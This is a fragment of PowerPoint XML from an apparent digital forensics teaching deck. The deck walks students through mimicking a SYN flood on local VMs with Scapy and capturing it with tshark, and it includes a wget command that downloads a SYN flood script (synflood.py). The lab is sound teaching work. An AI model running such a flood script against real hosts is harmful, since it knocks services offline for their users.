                <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>wget wget https://raw.githubusercontent.com/frankwxu/digital-forensics-lab/main/Illegal_Possession_Images/lab_files/SYN_Flood/synflood.py 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862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705215-D301-21B9-51D1-C8A387B4E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255378"/>
            <a:ext cx="5963855" cy="37263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5BDD95-B9F7-E1F1-74A5-FD9258B88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9014B-D8D0-F74D-40F2-6F0E7C2D26EB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838199" y="1886046"/>
            <a:ext cx="237898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Use lo device</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="4227508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2A4FE5-5D00-41AF-25CB-2D9B304EC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632" y="1810638"/>
            <a:ext cx="6845751" cy="13326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31CE6-6BD3-E936-A833-5ECDA2AC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632" y="4054775"/>
            <a:ext cx="9055836" cy="1155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EAD3B2-8502-A889-3E9F-A74C3207493D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1094631" y="1463159"/>
            <a:ext cx="505819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 one terminal waiting and capturing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6AB25-0426-D99F-A5A0-ED3D7690AA6F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1094632" y="3661293"/>
            <a:ext cx="4229036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Using another terminal to sending packets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BC74BF-3FF2-130C-9E81-031F80E54A4D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6707537" y="829067"/>
            <a:ext cx="48232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# make sure web server is running</a:t>
            </a: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service apache2 start</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2463134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8EB57-B716-FA71-B163-1406E704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31" y="2293521"/>
            <a:ext cx="11042337" cy="22709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ADD942D-7D91-09D0-10AE-18511B4A4EA0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="574831" y="1924189"/>
            <a:ext cx="267206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View SYN flood attack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F9EE2-FA0F-196F-B536-C8922C6A6253}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="738106" y="5167110"/>
            <a:ext cx="101804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Segoe Print" panose="02000600000000000000" pitchFamily="2" charset="0"/>
              </a:rPr>
              <a:t>You can download the captured packets here </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" err="1">
                <a:latin typeface="OCRB" panose="020B0609020202020204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>wget</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:latin typeface="OCRB" panose="020B0609020202020204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> https://raw.githubusercontent.com/frankwxu/digital-forensics-lab/main/Illegal_Possession_Images/lab_files/SYN_Flood/mySYNFloodCapture.pcap</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="711315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0696-6E5D-2644-6EAC-BC9C4DB60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897D7-6233-92B2-8F6A-CBE08E35D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two VMs</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Mimic the SYN attack</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Show evidence of the attack</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="19727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32861</TotalTime>
  <Words>763</Words>
  <Application>Microsoft Office PowerPoint</Application>
  <PresentationFormat>Widescreen</PresentationFormat>
  <Paragraphs>92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OCRB</vt:lpstr>
      <vt:lpstr>Segoe Print</vt:lpstr>
      <vt:lpstr>Times New Roman</vt:lpstr>
      <vt:lpstr>Office Theme</vt:lpstr>
      <vt:lpstr>HTTP, tshark, SYN Flood</vt:lpstr>
      <vt:lpstr>Three-way handshaking</vt:lpstr>
      <vt:lpstr>PowerPoint Presentation</vt:lpstr>
      <vt:lpstr>PowerPoint Presentation</vt:lpstr>
      <vt:lpstr>What if the client never completes  handshaking process?</vt:lpstr>
      <vt:lpstr>Mimic an SYN flood attack</vt:lpstr>
      <vt:lpstr>Design</vt:lpstr>
      <vt:lpstr>Install Scapy</vt:lpstr>
      <vt:lpstr>PowerPoint Presentation</vt:lpstr>
      <vt:lpstr>Attacking</vt:lpstr>
      <vt:lpstr>PowerPoint Presentation</vt:lpstr>
      <vt:lpstr>PowerPoint Presentation</vt:lpstr>
      <vt:lpstr>Assignment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2416</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2020-09-14T14:43:27Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-07-22T04:52:36Z</dcterms:modified>
</cp:coreProperties>
</file>